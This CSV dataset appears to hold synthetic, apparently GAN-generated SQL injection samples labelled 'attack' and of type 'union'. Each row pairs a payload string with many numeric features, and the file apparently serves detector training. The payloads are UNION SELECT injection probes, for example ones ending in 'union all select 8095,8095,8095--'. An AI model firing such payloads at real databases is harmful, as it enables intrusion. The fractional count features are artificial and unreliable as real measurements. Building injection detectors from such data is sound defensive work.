id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,payload_length,alpha_count,digit_count,space_count,upper_count,lower_count,symbol_count,printable_ratio,alpha_ratio,digit_ratio,space_ratio,symbol_ratio,entropy,single_quote_count,double_quote_count,dash_count,hash_count,slash_count,backslash_count,left_paren_count,right_paren_count,comma_count,semicolon_count,equals_count,greater_count,less_count,percent_count,plus_count,asterisk_count,at_count,url_encoded_count,hex_literal_count,unicode_escape_count,comment_marker_count,comparison_op_count,function_call_count,quoted_string_count,kw_select,kw_union,kw_where,kw_from,kw_sleep,kw_benchmark,kw_pg_sleep,kw_waitfor,kw_delay,kw_case,kw_when,kw_then,kw_else,kw_end,kw_exists,kw_order,kw_group,kw_having,kw_information_schema,kw_sysibm,kw_mysql,kw_sqlite,kw_substring,kw_substr,kw_ascii,kw_char,kw_cast,kw_convert,kw_concat,kw_update,kw_delete,kw_insert,kw_drop,kw_create,kw_table,kw_database,kw_user,kw_version,kw_and,kw_or,kw_not,kw_like,kw_by,sql_keyword_total,boolean_signal,union_signal,time_signal,error_signal,order_signal,exists_signal,stacked_signal
GAN_000029,attack,union,"-7564'  )   as nank where 8095  =  8095 union all select 8095,8095,8095--",nearest_attack_euclidean,R000043,3.1651456262395934,82.04627227783203,28.5224609375,22.257495880126953,14.042537689208984,0.5100191831588745,33.805179595947266,11.875163078308105,0.9150862097740173,0.3482002317905426,0.3129090368747711,0.17629365622997284,0.13510601222515106,4.085251808166504,1.2720633745193481,0.2548886835575104,2.3559038639068604,0.037619613111019135,0.026476556435227394,0.03219327703118324,0.21902117133140564,0.6583252549171448,3.4771604537963867,0.050208043307065964,0.6039090752601624,-0.05661063641309738,0.016155632212758064,0.16202281415462494,0.16599194705486298,0.200359046459198,0.23907262086868286,0.09985965490341187,0.2599594295024872,-0.11155211925506592,1.0023657083511353,0.6061049103736877,0.06795583665370941,0.45384156703948975,1.4260876178741455,1.0847512483596802,0.5551877021789551,0.3707744777202606,0.009293004870414734,-0.01663881540298462,-0.1474742740392685,0.16215373575687408,0.17972266674041748,-0.17469251155853271,-0.09282132238149643,-0.11246322095394135,-0.3288809061050415,-0.07007762789726257,0.0816681757569313,-0.14447133243083954,-0.07681266963481903,0.014709703624248505,0.014441685751080513,0.0627003163099289,-0.07289581745862961,0.20491723716259003,-0.054646920412778854,-0.10928429663181305,0.06998948752880096,0.014632786624133587,0.3190980851650238,-0.114837646484375,-0.09807689487934113,-0.1359296590089798,-0.153401181101799,-0.08364557474851608,0.12488503754138947,-0.07074151933193207,-0.06178548187017441,0.012040063738822937,-0.08753158152103424,0.21424251794815063,0.0680994763970375,0.10693932324647903,0.08542963862419128,0.006468234583735466,0.07664036005735397,3.8845157623291016,0.09413210302591324,1.049981713294983,-0.010156869888305664,0.2559927999973297,0.10946384072303772,-0.09515459835529327,0.028268298134207726
GAN_000030,attack,union,"-7564'  )   as nank where 8095  =  8095 union all select 8095,8095,8095--",nearest_attack_euclidean,R000043,3.3054564929222683,77.80448150634766,28.30975914001465,21.891128540039062,12.541841506958008,0.7423475980758667,31.98838233947754,11.53719425201416,0.9477069973945618,0.3440725803375244,0.2947773039340973,0.17648562788963318,0.13419418036937714,4.049253463745117,1.233264446258545,0.26203057169914246,2.2566213607788086,0.04329496994614601,0.008265139535069466,-0.019948285073041916,0.31706416606903076,0.5986666679382324,3.3745248317718506,0.06499332934617996,0.6521185040473938,0.04596414417028427,0.04814325273036957,0.20566213130950928,0.13703496754169464,0.24483712017536163,0.2694777548313141,0.21906396746635437,0.04918045550584793,-0.2609471082687378,0.9209797382354736,0.7756802439689636,0.08837461471557617,0.2685680687427521,1.430965542793274,0.9665806293487549,0.6751296520233154,0.4711626470088959,-0.06164010614156723,-0.12068711966276169,0.09136679768562317,0.10991036891937256,0.033528976142406464,-0.1650465726852417,-0.4397028684616089,-0.03687151148915291,-0.38509953022003174,0.23410741984844208,-0.055434830486774445,0.27312901616096497,0.322425901889801,0.049350813031196594,0.00039122888119891286,0.1105513647198677,0.06088491529226303,0.25168049335479736,0.1560305655002594,0.15895986557006836,-0.16622567176818848,0.02259964682161808,0.3908138573169708,0.1336599588394165,-0.18395739793777466,-0.033603593707084656,-0.23004867136478424,-0.13115420937538147,-0.028828680515289307,-0.12120994925498962,-0.1264892816543579,-0.09606589376926422,0.016425587236881256,0.24804165959358215,0.0545743927359581,0.05020623281598091,0.18233439326286316,-0.17105205357074738,0.15614360570907593,4.39522647857666,0.11280834674835205,1.0800089836120605,-0.08521231263875961,0.19610914587974548,-0.12526080012321472,0.20370514690876007,0.04404722899198532
GAN_000031,attack,union,"-7564'  )   as nank where 8095  =  8095 union all select 8095,8095,8095--",nearest_attack_euclidean,R000043,3.146142598966841,84.82453155517578,28.495887756347656,23.728403091430664,14.48139762878418,0.9155893921852112,31.258310317993164,11.169839859008789,0.8954334855079651,0.36115604639053345,0.2924429774284363,0.1802481710910797,0.13397090137004852,4.076898574829102,1.258959174156189,0.40098243951797485,2.5512421131134033,0.06535255908966064,0.07758013159036636,0.01500831451267004,0.29527124762535095,0.581990122795105,3.4443717002868652,0.059884149581193924,0.6796696186065674,0.06118530035018921,0.05997295305132866,0.19835330545902252,0.3686997890472412,0.2586647868156433,0.26952770352363586,-0.0065542832016944885,0.21095484495162964,-0.13934582471847534,0.9313343167304993,0.6979904770851135,0.0568285807967186,0.46730944514274597,1.3968431949615479,0.9742355942726135,0.6336004734039307,0.32728809118270874,0.004670746624469757,0.20000949501991272,-0.20522740483283997,-0.019620977342128754,0.04299475997686386,0.027919255197048187,-0.08092759549617767,0.01595945656299591,0.05867330729961395,0.13501906394958496,-0.03486212342977524,0.07403290271759033,-0.06848818808794022,0.2346881628036499,0.012381845153868198,0.16314497590065002,-0.17190755903720856,-0.023819558322429657,0.017833687365055084,0.06544103473424911,-0.03982128947973251,0.00806925818324089,0.22492793202400208,-0.16092804074287415,-0.18390902876853943,-0.039782315492630005,-0.07136519253253937,0.14639167487621307,0.07714617252349854,-0.030971914529800415,-0.07369481772184372,-0.10087630152702332,0.12950146198272705,0.2585082948207855,0.029619116336107254,0.05918010324239731,0.29501235485076904,-0.00649353489279747,4.063546657562256e-05,3.927675724029541,0.05436975881457329,1.0640379190444946,0.0023993104696273804,0.3282378911972046,0.08240236341953278,-0.006577363237738609,0.033057305961847305
GAN_000032,attack,union,"-9574'  )   as rxym where 4719  =  4719 union all select 4719,4719,4719,4719,4719,4719,4719--",nearest_attack_euclidean,R000036,3.065477380274765,81.67924499511719,30.169574737548828,24.530006408691406,14.352025032043457,0.4330631196498871,29.611494064331055,11.675664901733398,1.0285006761550903,0.3605426549911499,0.3086046874523163,0.17454032599925995,0.13416710495948792,4.069812297821045,1.4979218244552612,0.19804954528808594,2.4505081176757812,0.03513529151678085,0.05293658748269081,0.05754530802369118,0.31305840611457825,0.5870289206504822,4.2953267097473145,0.03887948766350746,0.6012542247772217,0.0006812047213315964,0.02332179620862007,0.23325033485889435,0.18662512302398682,0.27007949352264404,0.2077723890542984,0.007078021764755249,0.17158320546150208,-0.010475827381014824,0.9692027568817139,0.754114031791687,0.08972568064928055,0.35134103894233704,1.3969751596450806,0.9146522879600525,0.6748891472816467,0.3561585247516632,0.022751756012439728,-0.11988896876573563,-0.16589570045471191,0.20631179213523865,0.10957137495279312,-0.21736958622932434,0.0013762451708316803,-0.04782010242342949,-0.3705509305000305,0.09349143505096436,0.045911990106105804,-0.17736265063285828,-0.014237622730433941,0.1394166797399521,0.01972193457186222,0.08228878676891327,-0.13817165791988373,0.1824742704629898,0.0005573034286499023,0.18768760561943054,0.12812313437461853,0.02278291806578636,0.08356299251317978,0.07641733437776566,-0.12536898255348206,-0.20236556231975555,-0.11648480594158173,0.015265561640262604,-0.0036325305700302124,-0.16109846532344818,-0.09044118970632553,-0.06587064266204834,-0.1241912841796875,0.2053038477897644,0.06295203417539597,0.09538502991199493,0.11099004745483398,-0.14778326451778412,-0.025918275117874146,3.924523115158081,0.10775142908096313,1.1283434629440308,-0.057387642562389374,0.30575594305992126,-0.03320156782865524,0.155265212059021,0.030150657519698143
GAN_000033,attack,union,"-7564'  )   as nank where 8095  =  8095 union all select 8095,8095,8095--",nearest_attack_euclidean,R000043,3.1591471733113448,81.7391586303711,31.273265838623047,23.96316909790039,13.18382740020752,0.06966807693243027,30.70524787902832,11.651840209960938,1.0995705127716064,0.34977445006370544,0.30230513215065,0.17781193554401398,0.13610613346099854,4.057699203491211,1.4877668619155884,0.3300103545188904,2.4952380657196045,0.026910042390227318,0.04650421068072319,0.002776961075142026,0.32362377643585205,0.5631630420684814,3.6956546306610107,0.018683284521102905,0.5760247111320496,-0.137224018573761,0.049158498644828796,0.19576464593410492,0.17685936391353607,0.28234511613845825,0.25240519642829895,0.01559765636920929,0.10478511452674866,-0.036494433879852295,0.9722359776496887,0.7643008828163147,0.09000063687562943,0.3752596378326416,1.411786437034607,1.0123629570007324,0.6492138504981995,0.3207596242427826,0.04143785312771797,0.0008443370461463928,-0.15024255216121674,0.24561193585395813,0.13023653626441956,-0.07143023610115051,-0.17432385683059692,-0.03237607330083847,-0.3509829640388489,0.1863691359758377,0.011117734014987946,-0.024027690291404724,-0.035869888961315155,0.06548859179019928,0.02404266595840454,0.05938507616519928,-0.10383708029985428,0.34291452169418335,-0.08115863054990768,0.11394897848367691,0.0025191307067871094,0.028257859870791435,0.2608306109905243,-0.0459449477493763,0.01822490245103836,-0.10055508464574814,-0.19468936324119568,-0.11458665877580643,0.1381646990776062,-0.046995747834444046,-0.004623159766197205,0.0561627559363842,0.053378187119960785,0.2109197974205017,0.038587529212236404,0.07237127423286438,0.07592083513736725,-0.09890105575323105,-0.046305686235427856,3.8375306129455566,0.09000395238399506,1.0668697357177734,-0.02364916354417801,0.42510291934013367,0.10138589143753052,0.05960022285580635,0.02041580155491829
GAN_000034,attack,union,"-7564'  )   as nank where 8095  =  8095 union all select 8095,8095,8095--",nearest_attack_euclidean,R000043,3.1748176213589376,81.206298828125,29.482650756835938,23.41836166381836,14.133708953857422,0.3908674120903015,29.393918991088867,11.326556205749512,1.0292201042175293,0.38013529777526855,0.3160126507282257,0.17796078324317932,0.13704590499401093,4.098791599273682,1.3162649869918823,0.23505903780460358,2.3925209045410156,0.09303735196590424,0.06865277886390686,0.07510244101285934,0.3083924353122711,0.5451146960258484,3.9419057369232178,0.04245695844292641,0.5772039890289307,0.0584428608417511,0.040577515959739685,0.19392293691635132,0.23472708463668823,0.26429614424705505,0.255580872297287,-0.1309107393026352,0.14405713975429535,-0.11597734689712524,0.9477653503417969,0.7501211762428284,0.0793561264872551,0.4311177432537079,1.4571163654327393,1.0212507247924805,0.6242220401763916,0.3715544641017914,0.07627139985561371,-0.028262779116630554,-0.17225196957588196,0.044698864221572876,0.024803169071674347,-0.018070008605718613,-0.06315077841281891,-0.035114482045173645,-0.12853366136550903,-0.06904253363609314,0.037032175809144974,-0.06679482012987137,-0.013521241024136543,0.08031319826841354,0.016257284209132195,0.02118200808763504,-0.17024236917495728,0.16870856285095215,-0.07738405466079712,-0.1404685378074646,0.05887759104371071,0.021425258368253708,0.21152764558792114,-0.004285827279090881,-0.23361623287200928,-0.02495911717414856,-0.10718048363924026,-0.003422759473323822,0.10491038858890533,-0.08348935842514038,-0.05819440633058548,-0.08977068960666656,0.03167640045285225,0.22008727490901947,0.04727983474731445,0.08321481198072433,0.10822410136461258,0.05935840308666229,0.02222377061843872,4.062110900878906,0.0871252566576004,1.0323293209075928,0.04706363379955292,0.3779807686805725,0.05772949382662773,0.022655319422483444,0.01229402981698513
GAN_000035,attack,union,"-7564'  )   as nank where 8095  =  8095 union all select 8095,8095,8095--",nearest_attack_euclidean,R000043,3.292434770735777,80.1424789428711,29.78755760192871,21.103595733642578,14.172605514526367,0.5879341959953308,32.31698989868164,11.39035415649414,0.9137132167816162,0.38404548168182373,0.30830952525138855,0.17821966111660004,0.13444586098194122,4.105988025665283,1.3062740564346313,0.22152015566825867,2.295318126678467,0.05188533291220665,0.03502322733402252,0.01042527612298727,0.371196448802948,0.5965957641601562,3.610917568206787,0.05148845538496971,0.58120197057724,-0.006174646317958832,0.04707947373390198,0.16442109644412994,0.11547087132930756,0.1962701827287674,0.2447110265493393,-0.005665630102157593,0.20920053124427795,-0.2604503631591797,0.9961322546005249,0.7442842721939087,0.10851892083883286,0.5213724374771118,1.5024107694625854,1.0649023056030273,0.6564688682556152,0.3381984829902649,-0.011878140270709991,-0.021653011441230774,-0.07506514340639114,0.02820732444524765,0.07868244498968124,-0.22382885217666626,-0.0634402334690094,0.12874776124954224,-0.27099835872650146,-0.10572753846645355,0.1061490848660469,-0.04090496525168419,0.07617305964231491,-0.0777411237359047,0.009748199954628944,-0.21800824999809265,-0.07881386578083038,0.36520838737487793,-0.026844017207622528,-0.038332268595695496,0.09621759504079819,0.009621981531381607,0.25331127643585205,-0.03949955105781555,-0.21067672967910767,0.0066891685128211975,-0.1719377189874649,-0.017324618995189667,0.16094887256622314,0.12559066712856293,0.06664364784955978,-0.11466148495674133,0.08857940882444382,0.12819556891918182,0.03676963597536087,0.16196979582309723,0.1737310141324997,0.046125903725624084,0.0813627541065216,4.112605571746826,0.1257384568452835,1.0231328010559082,0.2751980423927307,0.41905951499938965,0.10990791022777557,0.011582758277654648,0.05269484594464302
GAN_000036,attack,union,"-9574'  )   as rxym where 4719  =  4719 union all select 4719,4719,4719,4719,4719,4719,4719--",nearest_attack_euclidean,R000036,3.1054168496421717,83.789794921875,29.151498794555664,24.028907775878906,14.692645072937012,0.8770807981491089,31.50299644470215,11.42363166809082,0.9595686197280884,0.37813878059387207,0.29985907673835754,0.17228050529956818,0.13834263384342194,4.074934959411621,1.3203320503234863,0.24103868007659912,2.373767852783203,0.05834881216287613,0.040640559047460556,0.028301740065217018,0.28030622005462646,0.5948522686958313,3.878736972808838,0.05456740781664848,0.7266935706138611,0.025854725390672684,0.03718121722340584,0.19468457996845245,0.14439283311367035,0.3121720552444458,0.19355465471744537,-0.08870803564786911,0.19316646456718445,-0.12918226420879364,0.9524131417274475,0.7840667366981506,0.07847106456756592,0.40641963481903076,1.4339702129364014,1.005342960357666,0.664381206035614,0.3677157759666443,0.03265927731990814,0.050454288721084595,-0.055714916437864304,0.17149269580841064,-0.03539405018091202,-0.13429459929466248,-0.08423800766468048,-0.003189433366060257,-0.1919785887002945,0.014468925073742867,0.01337984949350357,-0.022366870194673538,0.06210051104426384,-0.009495504200458527,0.007197728380560875,-0.1085166484117508,-0.001698419451713562,0.16837066411972046,0.011948786675930023,-0.07391329109668732,0.12418198585510254,0.010456101968884468,0.0624765008687973,-0.027252862229943275,-0.19795188307762146,-0.05830303207039833,-0.0905304104089737,0.0435539148747921,0.023958630859851837,0.08793476223945618,-0.0267648845911026,-0.049143463373184204,0.024895817041397095,0.20189890265464783,0.04767885431647301,0.11456005275249481,0.12966030836105347,-0.07273615896701813,0.06755568832159042,4.17289924621582,0.08786273002624512,1.1004836559295654,0.13175863027572632,0.1843571662902832,-0.09922398626804352,0.10673648118972778,0.03801856189966202
GAN_000037,attack,union,"-7564'  )   as nank where 8095  =  8095 union all select 8095,8095,8095--",nearest_attack_euclidean,R000043,3.192962317820566,81.787841796875,30.21483039855957,23.52549171447754,13.157977104187012,0.7794082760810852,30.7789249420166,11.492581367492676,1.1168315410614014,0.3467708230018616,0.30059584975242615,0.1681065410375595,0.13666658103466034,4.068491458892822,1.3561439514160156,0.22874414920806885,2.363961696624756,0.03932303935289383,0.03703346103429794,0.007962497882544994,0.32453614473342896,0.4957956075668335,3.697260618209839,0.042734626680612564,0.6326455473899841,0.02647405117750168,0.062131721526384354,0.23039615154266357,0.1408161222934723,0.31125879287719727,0.23415134847164154,-0.004262246191501617,0.20759207010269165,-0.00899854488670826,0.9389714598655701,0.7660536766052246,0.07120439410209656,0.26289284229278564,1.400292992591858,0.9584132432937622,0.713051438331604,0.4166277050971985,0.12208583950996399,-0.14343228936195374,-0.06446174532175064,0.1474122852087021,0.022145546972751617,-0.1809433400630951,-0.14048458635807037,-0.02307027578353882,-0.33394402265548706,0.1318398118019104,-0.028100527822971344,0.045023784041404724,0.1352575421333313,-0.04704383760690689,0.019458984956145287,-0.06850551068782806,-0.01604081690311432,0.2857151925563812,-0.10686076432466507,0.11496254056692123,0.052144650369882584,0.014411019161343575,0.20898571610450745,0.049743518233299255,-0.19745635986328125,-0.11301961541175842,-0.0828021913766861,-0.09421981126070023,0.0556616373360157,-0.06780532002449036,-0.09775998443365097,-0.06169159710407257,0.06430897116661072,0.2394271045923233,0.032658785581588745,0.07175001502037048,0.04193701222538948,-0.0914670005440712,0.07641053199768066,4.227023601531982,0.09268303215503693,1.1610569953918457,0.08057402074337006,0.2731389105319977,-0.09169745445251465,0.09515440464019775,0.050281036645174026
GAN_000038,attack,union,"-4711' in boolean mode  )   union all select 8007,8007,8007,8007,8007,8007--",nearest_attack_euclidean,R000034,3.1051300745368398,80.2457504272461,30.802194595336914,22.366525650024414,14.66666030883789,0.595316469669342,30.078723907470703,11.63824462890625,0.9660274386405945,0.3462819457054138,0.29939505457878113,0.16894294321537018,0.1364869326353073,4.0840654373168945,1.4638875722885132,0.22249963879585266,2.4682390689849854,0.04682305455207825,0.043646637350320816,0.05974539369344711,0.22931940853595734,0.5795903205871582,3.9695000648498535,0.047157950699329376,0.5534381866455078,-0.1354081928730011,0.027595438063144684,0.19875164330005646,0.17075562477111816,0.2515008747577667,0.24982494115829468,0.025604501366615295,0.13072450459003448,0.06438928842544556,0.9772264361381531,0.5549646019935608,0.04144267365336418,0.30161964893341064,1.3607488870620728,1.0393670797348022,0.6060646772384644,0.43276068568229675,0.09179813414812088,-0.10187245160341263,-0.16142526268959045,0.1999644935131073,0.1012091413140297,-0.17012235522270203,-0.26373639702796936,-0.06768910586833954,-0.32601481676101685,0.2626211643218994,0.16960152983665466,-0.14552076160907745,-0.04674601927399635,0.042856499552726746,0.02280052751302719,0.022484000772237778,-0.07317100465297699,0.15768685936927795,-0.10151273757219315,0.008452840149402618,0.14285223186016083,0.017207879573106766,0.15598084032535553,0.04118003696203232,-0.18017956614494324,-0.119107186794281,-0.12341055274009705,-0.040021441876888275,0.007513616234064102,-0.1452605128288269,-0.12867683172225952,0.021981775760650635,-0.16620978713035583,0.2727343440055847,0.06211192160844803,0.04709484800696373,0.05806265398859978,-0.16338162124156952,0.053175412118434906,3.954679489135742,0.11011934280395508,1.049512505531311,-0.18856707215309143,0.3137302100658417,0.020959187299013138,0.19129163026809692,0.009509751573204994
GAN_000039,attack,union,"-4711' in boolean mode  )   union all select 8007,8007,8007,8007,8007,8007--",nearest_attack_euclidean,R000034,3.121872623335435,80.82227325439453,30.098329544067383,23.198394775390625,14.005280494689941,0.2951294481754303,32.62308120727539,11.634481430053711,0.9168962836265564,0.3465549051761627,0.2919546067714691,0.17703288793563843,0.133832648396492,4.101274013519287,1.4450829029083252,0.3122556805610657,2.4605062007904053,0.006118191871792078,0.07788833230733871,0.02557937055826187,0.24418996274471283,0.687714695930481,3.7515668869018555,0.04296553507447243,0.5608433485031128,-0.12952721118927002,0.037564218044281006,0.17027203738689423,0.22553525865077972,0.24963119626045227,0.2403610497713089,0.043449148535728455,0.20839610695838928,-0.05162326246500015,0.9920446872711182,0.5869228839874268,0.07317284494638443,0.48259246349334717,1.3662588596343994,0.9818384647369385,0.5693948268890381,0.2986031770706177,-0.10799146443605423,0.02093346416950226,-0.29121482372283936,0.2071293443441391,0.21643739938735962,-0.06346724927425385,-0.060606684535741806,-0.07383960485458374,-0.2970092296600342,0.06672762334346771,0.008916504681110382,-0.08969205617904663,-0.09679623693227768,0.10943016409873962,0.016185574233531952,0.11893818527460098,-0.07436665892601013,0.2704448699951172,-0.04911772534251213,0.04009329527616501,-0.03714839369058609,0.018459398299455643,0.16658304631710052,-0.1354943960905075,-0.21008217334747314,-0.2139676809310913,-0.11697216331958771,-0.0014918148517608643,0.03749842941761017,-0.06918120384216309,0.006417110562324524,0.053656525909900665,-0.03486163169145584,0.17033375799655914,0.06649927794933319,0.06192146614193916,0.17144501209259033,-0.12838678061962128,-0.10720771551132202,3.6738970279693604,0.10567276179790497,1.0370296239852905,-0.16478008031845093,0.373899906873703,0.22755709290504456,0.07173928618431091,0.04157891869544983
GAN_000040,attack,union,"-7564'  )   as nank where 8095  =  8095 union all select 8095,8095,8095--",nearest_attack_euclidean,R000043,3.179664633207347,80.462890625,28.07369613647461,23.78261375427246,14.177851676940918,0.6100584864616394,31.851581573486328,11.691526412963867,0.8105112910270691,0.34580111503601074,0.3018674850463867,0.17446693778038025,0.1345660537481308,4.095836639404297,1.398972749710083,0.24601976573467255,2.3785860538482666,0.07642455399036407,0.06724604964256287,0.03247765451669693,0.28742527961730957,0.7056111097335815,3.922518014907837,0.05053846538066864,0.5880494713783264,0.1537664830684662,0.026369241997599602,0.17269934713840485,0.26556074619293213,0.3396744430065155,0.24191370606422424,-0.07141177356243134,0.1869017481803894,-0.11344505846500397,0.9458721280097961,0.7607263326644897,0.08326201140880585,0.34901586174964905,1.377077579498291,0.8315663933753967,0.6909879446029663,0.38226988911628723,0.040519874542951584,-0.015903227031230927,-0.05817406252026558,0.12846839427947998,0.19352108240127563,-0.10366936028003693,-0.028140973299741745,0.08810785412788391,-0.22498343884944916,0.06237895041704178,0.224293053150177,-0.029467452317476273,0.0066403476521372795,0.20370352268218994,0.015228606760501862,0.07348895817995071,-0.15804609656333923,0.1747332513332367,0.1175651103258133,0.04916175454854965,0.07285258173942566,0.01606861501932144,0.0692518800497055,-0.007339105010032654,-0.3346909284591675,-0.07536038756370544,-0.11352504044771194,0.0734957754611969,-0.16034775972366333,-0.04567783698439598,-0.08044367283582687,-0.019544079899787903,-0.12042906135320663,0.19739381968975067,0.07689870148897171,0.07430849224328995,0.08049304783344269,-0.11936111003160477,0.07521659135818481,4.134124279022217,0.1155305802822113,1.095592737197876,-0.04370317608118057,0.2656014859676361,0.04792394861578941,0.20617198944091797,0.05790269002318382
GAN_000041,attack,union,"-7564'  )   as nank where 8095  =  8095 union all select 8095,8095,8095--",nearest_attack_euclidean,R000043,3.0819646056683454,82.88081359863281,27.724550247192383,23.963577270507812,14.117293357849121,0.8771457076072693,31.62862205505371,11.223262786865234,0.9411264061927795,0.3606400489807129,0.2901318371295929,0.18130439519882202,0.13425804674625397,4.037567138671875,1.0983891487121582,0.3463943898677826,2.533568859100342,0.06257080286741257,0.01858380250632763,0.0016883306670933962,0.24494610726833344,0.6393043994903564,3.38739275932312,0.06748462468385696,0.7321339845657349,0.04945904761552811,0.03255234658718109,0.21479669213294983,0.2563249170780182,0.2316785752773285,0.22341668605804443,0.09521424770355225,0.22458869218826294,-0.2049754112958908,0.9387340545654297,0.746469259262085,0.07724738866090775,0.44505244493484497,1.4263852834701538,1.021087646484375,0.5763753652572632,0.36548861861228943,0.05312225595116615,0.10414700210094452,-0.05383835360407829,0.015477538108825684,-0.006515808403491974,-0.04080526530742645,-0.1795986294746399,-0.11289064586162567,-0.0723019540309906,0.06712362170219421,-0.043130435049533844,0.10263833403587341,-0.0029348069801926613,0.1622205674648285,0.019101589918136597,0.16389811038970947,-0.18099893629550934,0.07936730980873108,0.0901893675327301,0.019115693867206573,-0.0869164988398552,0.016448983922600746,0.4103536903858185,-0.05706273764371872,0.0009152069687843323,-0.1353655308485031,-0.10100789368152618,0.07975997775793076,0.1429273784160614,-0.07964429259300232,-0.08915909379720688,-0.1016903817653656,0.057863228023052216,0.2962069809436798,0.03615216165781021,0.10098133236169815,0.24812927842140198,0.07601568102836609,0.043828271329402924,4.02490758895874,0.05477380007505417,1.0644841194152832,-0.039040930569171906,0.21278174221515656,-0.07221812009811401,-0.1587902307510376,0.0272093303501606
GAN_000042,attack,union,"-4711' in boolean mode  )   union all select 8007,8007,8007,8007,8007,8007--",nearest_attack_euclidean,R000034,3.063475481649643,80.60191345214844,31.305875778198242,23.252779006958008,13.882708549499512,0.684159517288208,30.286388397216797,11.483675003051758,1.054592251777649,0.34564730525016785,0.3098345994949341,0.1749914437532425,0.13546344637870789,4.064897537231445,1.3883733749389648,0.22373756766319275,2.485602855682373,0.037398360669612885,0.0370810367166996,0.05103076994419098,0.23333832621574402,0.6333433389663696,3.865304470062256,0.04667776823043823,0.6042999029159546,-0.09153401851654053,0.02887149155139923,0.2314731478691101,0.19437110424041748,0.2430185079574585,0.23781704902648926,0.10701026022434235,0.15085649490356445,0.05158695578575134,0.9879716038703918,0.6138207912445068,0.06033410131931305,0.34605392813682556,1.3612041473388672,1.0320404767990112,0.5539620518684387,0.3981624245643616,0.007574886083602905,-0.05832789093255997,-0.21429219841957092,0.1457420140504837,0.05641622096300125,-0.15296238660812378,-0.18934360146522522,-0.16874122619628906,-0.3496227264404297,0.0768914669752121,0.06144709885120392,-0.08670666813850403,-0.023743169382214546,0.07770920544862747,0.023215949535369873,0.03707832843065262,-0.029953397810459137,0.07205881923437119,-0.047635722905397415,0.0152357816696167,0.1267739236354828,0.014037290588021278,0.1809893697500229,-0.06134717911481857,-0.08859285712242126,-0.19055992364883423,-0.12848903238773346,-0.02828553318977356,0.09693145751953125,-0.1403578221797943,-0.1623179018497467,0.04929853975772858,-0.08121979236602783,0.24405410885810852,0.06895311176776886,0.09620776027441025,0.09751900285482407,-0.19188523292541504,0.0480482392013073,3.89737868309021,0.09865940362215042,1.1296439170837402,-0.1251661479473114,0.2849952280521393,0.0015190094709396362,0.09283711016178131,0.015188900753855705
GAN_000043,attack,union,"-7564'  )   as nank where 8095  =  8095 union all select 8095,8095,8095--",nearest_attack_euclidean,R000043,3.055700266067597,83.32366943359375,29.291715621948242,24.897485733032227,14.877998352050781,0.6211371421813965,30.741064071655273,11.051253318786621,0.9124880433082581,0.3714456260204315,0.2941668927669525,0.1766129434108734,0.13552455604076385,4.089548587799072,1.3896386623382568,0.26307904720306396,2.456740140914917,0.05784405767917633,0.06046653166413307,0.03585983067750931,0.2524842917919159,0.6233218312263489,3.944075107574463,0.05014923959970474,0.6518646478652954,0.013770975172519684,0.03815643489360809,0.1858367770910263,0.24765433371067047,0.27294737100601196,0.23309893906116486,-0.08300571888685226,0.172150656580925,-0.05035995692014694,0.9587070941925049,0.7145686745643616,0.08227424323558807,0.5005590319633484,1.4069814682006836,0.9209696054458618,0.6637734174728394,0.34595632553100586,-0.025430336594581604,0.009216021746397018,-0.21535539627075195,0.10222184658050537,0.04038392752408981,-0.07849741727113724,-0.008738499134778976,0.03434184566140175,-0.07232566177845001,0.06878713518381119,-0.00762784481048584,-0.03721746802330017,-0.016688143834471703,0.2018817663192749,0.015978991985321045,0.12172498553991318,-0.08997111022472382,0.14918221533298492,-0.09792520850896835,0.06940298527479172,0.07099928706884384,0.015350117348134518,0.03551771864295006,-0.07788990437984467,-0.24109065532684326,-0.07187099754810333,-0.027940858155488968,0.09915831685066223,0.03630395233631134,-0.017333507537841797,0.029535826295614243,-0.030732735991477966,-0.03341100364923477,0.19791662693023682,0.0470559261739254,0.09519973397254944,0.18806883692741394,-0.07756558805704117,-0.05222296714782715,4.036344051361084,0.09023632854223251,1.0985984802246094,0.06825871765613556,0.21185645461082458,0.04864433780312538,0.06531320512294769,0.04270857945084572
